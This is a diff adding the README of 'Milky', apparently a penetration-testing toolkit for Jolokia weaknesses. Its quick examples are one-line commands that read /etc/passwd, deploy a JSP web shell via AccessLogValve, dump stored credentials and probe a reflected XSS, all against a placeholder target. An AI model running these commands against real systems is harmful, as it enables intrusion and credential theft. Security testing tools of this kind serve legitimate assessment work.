@@ -1,0 +1,46 @@
+# Milky
+
+Milky is a lightweight, one‑file toolkit that helps pentesters quickly verify
+and exploit common Jolokia misconfigurations / weaknesses (File‑read,
+AccessLogValve RCE, UserDatabase dump, Spring `EnvironmentManager` abuse,
+reflected XSS CVE‑2018‑1000129).
+
+> Milk soothes the spice, Milky calms down the Jolokia heat. 
+
+## Installation
+
+```bash
+git clone https://github.com/unclej4ck/milky.git
+cd milky
+python3 -m venv venv && . venv/bin/activate
+pip install -r requirements.txt
+```
+
+## Quick examples
+
+# verification of Jolokia misconfiguration
+python3 milky.py http://target:8080/jolokia scan
+
+# read /etc/passwd through DiagnosticCommand
+python3 milky.py http://target:8080/jolokia read -f /etc/passwd
+
+# drop & verify a JSP shell via AccessLogValve
+python3 milky.py http://target:8080/jolokia deploy
+
+# dump credentials from the UserDatabase MBean
+python3 milky.py http://target:8080/jolokia creds
+
+# reflected‑XSS probe (CVE‑2018‑1000129)
+python3 milky.py http://target:8080/jolokia xss
+
+> Add --debug for full HTTP traces and --user/--password for Basic‑Auth.
+
+
+## TO-DO
+- [ ] Adding more exploits
+- [ ] Adding more verifications
+- [ ] Fixing bugs
+
+## Credits
+
+Thanks to laluka for his work on [jolokia-exploit](https://github.com/laluka/jolokia-exploitation-toolkit).
